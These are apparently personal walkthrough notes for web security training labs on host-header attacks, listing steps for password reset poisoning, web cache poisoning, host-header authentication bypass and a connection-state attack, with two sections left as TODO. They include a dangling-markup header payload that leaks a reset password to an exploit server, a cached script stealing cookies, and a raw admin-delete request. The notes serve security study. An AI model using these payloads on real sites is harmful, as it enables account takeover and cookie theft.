## LAB payloads
#### Basic password reset poisoning
- use forgot password functionality 
- change name to carlos 
- change host header to exploit server 
- use token

#### Password reset poisoning via middleware
- add X-Forwarded-Host header with exploit server
- change name to carlos
- use it in correct recover link

#### Password reset poisoning via dangling markup
- find that host header doesn't filter ports
- main idea - add link which will sent new password to exploit server
- add to host header
```
:'></a><a href="https://exploit-...exploit-server.net/?
```
- change name in forgot password to carlos
- use his password

#### Web cache poisoning via ambiguous requests
- use cache buster (/?bubu=4)
- find that second host header is being ignored but the same time it is being reflected in tracking.js link 
- after request is cached remove second host header and find that it is still reflected 
- so here is the way: create payload on exploit server with the path
```
/resources/js/tracking.js
alert(document.cookie)
```
- add second host header with exploit server
- poison cache without cache buster

#### Host header authentication bypass
- find that admin panel is accessible only from local machine
- change host header to localhost
- using repeater go to admin
- then request link to delete carlos

#### Host validation bypass via connection state attack
- find feature first released in burp v 2022.8.1
- create group of 2 requests
  - first to / 
  - second to /admin with **Host: 192.168.0.1**
  - change Connection header to keep-alive
  - after you get admin page, take:
    - link, username and csrf token
- change second req in group to post:
```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```

#### Routing-based SSRF
TODO

#### SSRF via flawed request parsing
TODO


